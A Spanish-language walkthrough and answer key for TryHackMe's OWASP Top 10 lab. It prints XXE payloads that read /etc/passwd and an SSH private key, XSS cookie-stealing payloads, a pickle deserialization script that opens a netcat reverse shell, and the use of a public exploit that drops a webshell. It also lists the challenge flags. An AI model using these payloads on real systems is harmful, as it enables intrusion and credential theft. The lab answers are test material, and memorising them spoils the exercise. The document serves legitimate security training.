# OWASP Top 10

| **Dificultad** | Easy |
| **Tipo** | Laboratorio guiado de las 10 principales vulnerabilidades web de OWASP (formato "10 días") |
| **Slug** | `owasptop10` |
| **Link** | [TryHackMe](https://tryhackme.com/room/owasptop10) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | evilshell.php (command injection), /etc/passwd, lsb_release, MOTD (`/etc/update-motd.d/00-header`), registro de usuarios con espacio (darren/arthur), directorio `/assets` y `webapp.db` (cracking MD5), XML (prolog, schema), DTD (`!ELEMENT`, `!DOCTYPE`, `!ENTITY`), XXE (`file:///etc/passwd`, `/home/falcon/.ssh/id_rsa`), IDOR (`?note=`), PensiveNotes (credenciales por defecto `pensive:PensiveNotes`), XSS reflejado y almacenado, Apache Tomcat/Struts, cookies base64 y `userType`, RCE con pickle, Online Book Store 1.0 (exploit 47887.py), logs de login, John the Ripper/hashcat, Wireshark no aplicable |
| **Impacto** | Sala gigante que recorre A1-A10 de OWASP a través de 10 retos diarios: inyección de comandos (evilshell.php), autenticación rota por registro con espacio en blanco, exposición de datos sensibles (base de datos `webapp.db` con hash del admin descifrable), XXE para leer `/etc/passwd` y la clave privada SSH de `falcon`, IDOR para acceder a notas ajenas, configuración insegura (credenciales por defecto), XSS reflejado/almacenado con 5 niveles, deserialización insegura (cookies base64, `userType=admin`, RCE con pickle), componentes vulnerables (Online Book Store RCE) y análisis de logs para detectar fuerza bruta. Cierra cada bloque comprobando que "nunca se debe confiar en la coincidencia perfecta de nombre de usuario" ni en los datos serializados de entrada. |

---

**Contexto:** Esta sala pertenece a la franquicia "OWASP Top 10" de TryHackMe en su versión antigua, presentada como "un reto al día durante 10 días". Cada bloque despliega una pequeña aplicación web vulnerable sobre la que se practica un elemento concreto de la lista de OWASP. El dump numera 31 tareas (teorías + prácticas). El recorrido empieza con la inyección de comandos en `evilshell.php`, sigue con el bypass de autenticación registrando usuarios con un espacio inicial (` darren`/` arthur`), la recuperación de datos sensibles de `webapp.db`, la exfiltración de archivos vía XXE (lectura de `/etc/passwd` y de `id_rsa` de falcon), los IDOR sobre la app de notas, las credenciales por defecto de PensiveNotes, los 5 niveles de XSS del "XSS Playground", las cookies manipulables de un panel en el que `userType` y `encodedPayload` permiten acceder al panel de admin y ejecutar comandos con un objeto pickle malicioso, y termina con el RCE de Online Book Store 1.0 (searchsploit `47887.py`) y el análisis de `login-logs` para identificar una fuerza bruta (IP `49.99.13.16`). Al terminar se refuerza el mensaje central: los inputs, las cookies y los datos serializados nunca son de fiar.

## Solucionario

### Task 1: Introducción

**Explicación:** Solo presenta la sala y el objetivo de aprender OWASP. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción y empieza la sala. | `No answer needed` |

### Task 2: Acceso a las máquinas

**Explicación:** Explica cómo desplegar y acceder a los laboratorios de la sala (VPN o access port). No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega tu primera máquina del reto. | `No answer needed` |

### Task 3: Premios diarios

**Explicación:** Detalla el sistema de premios por días de reto completados. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee cómo funcionan los premios diarios de la sala. | `No answer needed` |

### Task 4: Day 1 - Injection (teoría)

**Explicación:** Teoría de la inyección (SQLi y de comandos): nunca se deben concatenar datos del usuario en consultas o comandos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de la inyección del día 1. | `No answer needed` |

### Task 5: Day 1 - Inyección de comandos (práctica) — evilshell.php

**Explicación:** Se accede a `http://IP/evilshell.php`, una página que ejecuta comandos introducidos en un formulario. Con `ls` se ve `drpepper.txt`; `cat /etc/passwd` muestra las cuentas (los usuarios "reales" con UID>=1000 no existen, luego hay `0` usuarios no-root/no-service/no-daemon); `whoami` confirma el usuario `www-data` con shell `/usr/sbin/nologin`; `lsb_release` saca Ubuntu `18.04.4`; y el MOTD (`/etc/update-motd.d/00-header`) revela la bebida favorita: `DR PEPPER MAKES THE WORLD TASTE BETTER!`.

```bash
ls                      # drpepper.txt
cat /etc/passwd
whoami                  # www-data
lsb_release -a          # Ubuntu 18.04.4
cat /etc/update-motd.d/00-header   # DR PEPPER
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué extraño archivo de texto está en el directorio raíz del sitio web? | `drpepper.txt` |
| 2 | ¿Cuántos usuarios hay que no sean root, ni de servicio, ni daemons? | `0` |
| 3 | ¿Con qué usuario se ejecuta la aplicación? | `www-data` |
| 4 | ¿Cuál es la shell configurada para ese usuario? | `/usr/sbin/nologin` |
| 5 | ¿Qué versión de Ubuntu se está ejecutando? | `18.04.4` |
| 6 | Imprime el MOTD. ¿Qué bebida favorita se muestra? | `Dr Pepper` |

### Task 6: Day 2 - Authentication Bypass (teoría)

**Explicación:** Teoría de cómo falla la autenticación cuando se validan cuentas por coincidencia exacta de cadena antes de comprobar la contraseña.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría del día 2 sobre la autenticación rota. | `No answer needed` |

### Task 7: Day 2 - Bypass de autenticación (práctica) — darren y arthur

**Explicación:** En `http://IP:8888` existe un formulario de registro. Al intentar registrar `darren` falla porque la cuenta ya existe; el truco es registrarse con un espacio inicial (`" darren"`). La aplicación se queda con la versión limpia (`darren` con el espacio) al devolver los usuarios, pero al hacer login compara contra el directorio de usuarios real devolviendo la cuenta existente. Tras iniciar sesión como `" darren"` se lee la flag de la cuenta de darren, y repitiendo con `" arthur"` se obtiene la flag de arthur.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué flag encontraste en la cuenta de darren? | `fe86079416a21a3c99937fea8874b667` |
| 2 | Registra la cuenta con el espacio inicial y accede a ella. | `No answer needed` |
| 3 | ¿Qué flag encontraste en la cuenta de arthur? | `d9ac0f7db4fda460ac3edeb75d75e16e` |

### Task 8: Day 3 - Sensitive Data Exposure (teoría)

**Explicación:** Teoría sobre la exposición de datos sensibles (contraseñas en texto plano, hashes sin sal, almacenamiento inseguro).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de la exposición de datos sensibles. | `No answer needed` |

### Task 9: Day 3 - Material de apoyo I

**Explicación:** Material complementario sobre el uso de hashes y diccionarios para el reto.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el material de apoyo del día 3. | `No answer needed` |

### Task 10: Day 3 - Material de apoyo II

**Explicación:** Preparación del entorno y de las herramientas de descifrado (john).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Prepara el entorno para el reto. | `No answer needed` |

### Task 11: Day 3 - Exposición de datos sensibles (práctica) — webapp.db

**Explicación:** La webapp tiene en el código fuente de `/login` un comentario del developer: *"Must remember to do something better with the database than store it in /assets..."*. En `/assets` está `webapp.db`. Se descarga y, con sqlite3, se lee la tabla `users`: el admin tiene el hash MD5 `6eea9b7ef19179a06954edd0f6c05ceb`, que se descifra (p. ej., con crackstation o john + rockyou) a `qwertyuiop`. Con esas credenciales se hace login como admin y se recoge la flag.

```sql
-- sqlite3 webapp.db
.tables
SELECT * FROM users;   -- admin / 6eea9b7ef19179a06954edd0f6c05ceb
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Echa un vistazo a la webapp. El developer dejó una nota indicando datos sensibles en un directorio concreto. ¿Cuál es su nombre? | `/assets` |
| 2 | Navega al directorio de la pregunta anterior. ¿Qué archivo destaca por contener datos sensibles? | `webapp.db` |
| 3 | Usa el material de apoyo para acceder a los datos sensibles. ¿Cuál es el hash de la contraseña del admin? | `6eea9b7ef19179a06954edd0f6c05ceb` |
| 4 | Descifra el hash. ¿Cuál es la contraseña del admin en texto plano? | `qwertyuiop` |
| 5 | Inicia sesión como admin. ¿Cuál es la flag? | `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}` |

### Task 12: Day 4 - XML External Entity (teoría)

**Explicación:** Teoría de XXE: un procesador XML mal configurado puede resolver entidades externas y exfiltrar archivos locales o internos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría del día 4 sobre XXE. | `No answer needed` |

### Task 13: Day 4 - XML (fundamentos)

**Explicación:** Fundamentos de XML: el nombre completo de la tecnología, la obligatoriedad del prolog, la validación contra esquemas y el prolog para declarar versión y codificación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la forma completa de XML? | `Extensible Markup Language` |
| 2 | ¿Es obligatorio tener el prolog XML en los documentos XML? | `no` |
| 3 | ¿Podemos validar documentos XML contra un esquema? | `yes` |
| 4 | ¿Cómo podemos especificar la versión y codificación XML en un documento? | `XML prolog` |

### Task 14: Day 4 - DTD (tipos de documento)

**Explicación:** Sintaxis de las definiciones de tipo de documento (DTD): cómo se definen elementos, raíz y entidades personalizadas, que son la base del ataque XXE.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo defines un nuevo ELEMENT? | `!ELEMENT` |
| 2 | ¿Cómo defines el elemento ROOT? | `!DOCTYPE` |
| 3 | ¿Cómo defines una nueva ENTITY? | `!ENTITY` |

### Task 15: Day 4 - XXE (práctica, preparación)

**Explicación:** Se despliega la máquina del laboratorio XXE y se localiza la aplicación que procesa XML.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina del reto XXE. | `No answer needed` |

### Task 16: Day 4 - XXE (práctica) — lectura de archivos

**Explicación:** La app acepta un documento XML que imprime su contenido. El payload clásico con `DOCTYPE` y `ENTITY read SYSTEM 'file:///etc/passwd'` revela los usuarios; entre ellos está `falcon`. Modificando el payload para leer `/home/falcon/.ssh/id_rsa` se extrae la clave privada, cuyos primeros 18 caracteres son `MIIEogIBAAKCAQEA7`.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Accede a la aplicación web del ejercicio. | `No answer needed` |
| 2 | Prepara el payload XML para probar la vulnerabilidad XXE. | `No answer needed` |
| 3 | ¿Cuál es el nombre del usuario en /etc/passwd? | `falcon` |
| 4 | ¿Dónde está la clave SSH de falcon? | `/home/falcon/.ssh/id_rsa` |
| 5 | ¿Cuáles son los primeros 18 caracteres de la clave privada de falcon? | `MIIEogIBAAKCAQEA7` |

### Task 17: Day 5 - Broken Access Control (teoría)

**Explicación:** Teoría del control de acceso roto: los IDOR y los cambios de parámetro permiten acceder a recursos ajenos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría del día 5 sobre control de acceso. | `No answer needed` |

### Task 18: Day 5 - IDOR (práctica) — Pensive Notes

**Explicación:** Se accede a la aplicación de notas con `noot:test1234`. Al ver la propia nota, la URL contiene `?note=1`. Cambiando el valor a `0` se lee la nota de otro usuario y se obtiene la flag. (Truco clásico de enumeración de parámetros.)

```http
GET /note.php?note=0    # flag{fivefourthree}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina y accede a la aplicación de notas (`noot:test1234`). | `No answer needed` |
| 2 | Inicia sesión y visualiza tus notas. | `No answer needed` |
| 3 | Mira las notas de otros usuarios. ¿Cuál es la flag? | `flag{fivefourthree}` |

### Task 19: Day 6 - Security Misconfiguration (práctica) — PensiveNotes

**Explicación:** La documentación/README del proyecto PensiveNotes (buscable en GitHub) declara las credenciales por defecto `pensive:PensiveNotes`. Iniciando sesión con ellas se accede al panel y se obtiene la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Investiga el código fuente de la aplicación (README con credenciales por defecto). | `No answer needed` |
| 2 | Entra en la webapp y encuentra la flag. | `thm{4b9513968fd564a87b28aa1f9d672e17}` |

### Task 20: Day 7 - XSS (práctica) — XSS Playground

**Explicación:** En el "XSS Playground" hay pestañas de XSS reflejado y almacenado. Para el reflejado se usa `?keyword=<script>alert("Hello")</script>` (flag 1) y `?keyword=<script>alert(window.location.hostname)</script>` (flag 2). Para el almacenado se registra una cuenta, se publica un comentario y se inyecta HTML/JS (nivel 3 con `<br>`, nivel 4 con `<script>alert(document.cookie)</script>`); el último nivel modifica el elemento con `#thm-title` para cambiar "XSS Playground" por "I am a hacker".

```html
?keyword=<script>alert("Hello")</script>
?keyword=<script>alert(window.location.hostname)</script>
<script>alert(document.cookie)</script>
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Navega al XSS Playground y registra la cuenta. | `No answer needed` |
| 2 | Nivel 1 (reflejado): payload con popup "Hello". | `ThereIsMoreToXSSThanYouThink` |
| 3 | Nivel 2 (reflejado): popup con la IP de tu máquina. | `ReflectiveXss4TheWin` |
| 4 | Nivel 3 (almacenado): inserta tu propio HTML en un comentario. | `HTML_T4gs` |
| 5 | Nivel 4 (almacenado): alerta con tus cookies. | `W3LL_D0N3_LVL2` |
| 6 | Cambia "XSS Playground" por "I am a hacker". | `websites_can_be_easily_defaced_with_xss` |

### Task 21: Components with Known Vulnerabilities (teoría) — Tomcat

**Explicación:** Las aplicaciones usan componentes (Tomcat, Struts...) que heredan vulnerabilidades conocidas; una deserialización insegura puede provocar incluso un `Denial of Service`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Quién desarrolló la aplicación Tomcat? | `The Apache Software Foundation` |
| 2 | ¿Qué tipo de ataque que tumba servicios puede realizarse con deserialización insegura? | `Denial of Service` |

### Task 22: Deserialización: estados y comportamientos

**Explicación:** Teoría conceptual de la deserialización: los objetos serializados contienen tanto estados (datos) como comportamientos (métodos). El ejemplo pregunta por un perro durmiendo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Si un perro estuviera durmiendo, ¿sería esto: A) Un Estado, B) Un Comportamiento? | `A Behaviour` |

### Task 23: Representación binaria de datos

**Explicación:** Los datos viajan por la red en formato base-2.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se llama el formato base-2 con el que se envían los datos a través de la red? | `Binary` |

### Task 24: Cookies: path y conexión segura

**Explicación:** Teoría de cookies: el `path` limita la URL desde la que la cookie se envía, y las "Secure cookies" solo viajan sobre HTTPS.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Si una cookie tuviera el path `webapp.com/login`, ¿cuál sería la URL que debe visitar el usuario? | `webapp.com/login` |
| 2 | ¿Cuál es el acrónimo de la tecnología web sobre la que funcionan las cookies seguras? | `HTTPS` |

### Task 25: Deserialización insegura (práctica) — cookies base64

**Explicación:** Tras registrarse, la cookie `sessionid` contiene un valor en base64 (`gAN9cQAo...`). Decodificándolo se ve un objeto serializado con `encodedflag` → flag 1. Además, la cookie `userType` viene a `user`; cambiándola a `admin` y recargando se obtiene acceso al panel de administración y la flag 2.

```bash
echo -n "gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAOWIzYzVmYzkzMmM4NGZjYTg1MTFmZTc5ZDM3MzI4YWFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==" | base64 -d
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | 1ª flag (valor de la cookie). | `THM{good_old_base64_huh}` |
| 2 | 2ª flag (panel de administración). | `THM{heres_the_admin_flag}` |

### Task 26: Deserialización insegura (práctica) — RCE con pickle

**Explicación:** El script `pickleme.py` construye un objeto `pickle` cuyo `__reduce__` ejecuta la reverse shell configurada con la IP de la VPN de TryHackMe. El objeto se codifica en base64 y se coloca en la cookie `encodedPayload`. Al recargar la página de feedback se invoca la deserialización y se obtiene una shell; leyendo `../flag.txt` aparece la flag.

```python
import pickle, sys, base64
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_VPN_IP 4444 > /tmp/f'
class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))
print(base64.b64encode(pickle.dumps(rce())))
```

```bash
nc -lvnp 4444
cat ../flag.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el archivo flag.txt. | `4a69a7ff9fd68` |

### Task 27: Day 8 - Componentes vulnerables (teoría)

**Explicación:** Teoría sobre componentes y librerías con vulnerabilidades conocidas y su explotación con bases de exploit (exploit-db / searchsploit).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de componentes vulnerables. | `No answer needed` |

### Task 28: Day 8 - Componentes vulnerables (despliegue)

**Explicación:** Se despliega y reconoce el laboratorio del reto de componentes vulnerables.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina del reto de componentes. | `No answer needed` |

### Task 29: Componentes vulnerables (práctica) — Online Book Store

**Explicación:** El pie de la aplicación enlaza a `projectworlds`, indicando que usa "Online Book Store 1.0". `searchsploit` localiza el exploit "438787" de ejecución remota de código sin autenticar (`47887.py`). Ejecutándolo se sube una webshell PHP (`1RsdXbPkRo.php`), se abre una shell `RCE $` y `wc -c /etc/passwd` devuelve el número de caracteres.

```bash
searchsploit Online Book Store
python 47887.py http://IP:80
RCE $ wc -c /etc/passwd
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos caracteres tiene /etc/passwd (usa `wc -c /etc/passwd`)? | `1611` |

### Task 30: Day 9 - Insufficient Logging & Monitoring (práctica) — login-logs

**Explicación:** Se descarga `login-logs_1595366583422.txt`, un log de accesos a `/login`. Entre entradas `200 OK` normales destacan varias respuestas `401 Unauthorised` hacia la misma IP `49.99.13.16` probando distintos usuarios (`admin`, `administrator`, `anonymous`, `root`) en una rápida ráfaga: es un ataque de fuerza bruta.

```
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué dirección IP está usando el atacante? | `49.99.13.16` |
| 2 | ¿Qué tipo de ataque se está llevando a cabo? | `Brute Force` |

### Task 31: Conclusión

**Explicación:** Resumen de la sala: los diez riesgos principales de OWASP, ejercitados de forma práctica.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la conclusión del curso. | `No answer needed` |

---

**Metodología:** La sala se aborda día a día: (1) inyección de comandos descubriendo archivos y enumerando el sistema vía `evilshell.php`; (2) bypass de autenticación explotando el registro con espacios y la comparación tipo "cualquier coincidencia"; (3) exposición de datos: directorio `/assets`, base de datos SQLite y cracking del hash MD5 del admin; (4) XXE mediante `<!ENTITY ... SYSTEM 'file:///...'>` para leer archivos locales; (5) IDOR cambiando `?note=`; (6) configuración insegura con credenciales por defecto documentadas; (7) XSS reflejado/almacenado por niveles; (8) deserialización insegura manipulando cookies (`userType`) y construyendo payloads pickle (base64); (9) componentes vulnerables explotados con `searchsploit` (Online Book Store RCE); (10) revisión de logs para concluir fuerza bruta. Todo el recorrido se documenta con payloads y pasos verificables.
**Learning chain:** inyección de comandos → auth bypass (espacios) → datos sensibles + cracking de hashes → XXE/LFI → IDOR → credenciales por defecto → XSS por niveles → cookies y pickle (deserialización) → RCE en componentes → análisis de logs.
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059.006 (Command and Scripting Interpreter: Python), T1078 (Valid Accounts), T1212 (Exploitation for Credential Access), T1505.003 (Web Shell), T1027 (Obfuscated Files), T1041 (Exfiltration Over C2), T1110.001 (Password Guessing), T1606.001 (Web Session Cookie) — cubre A1-A10 de OWASP.
**Fuente:** [TryHackMe - OWASP Top 10](https://tryhackme.com/room/owasptop10)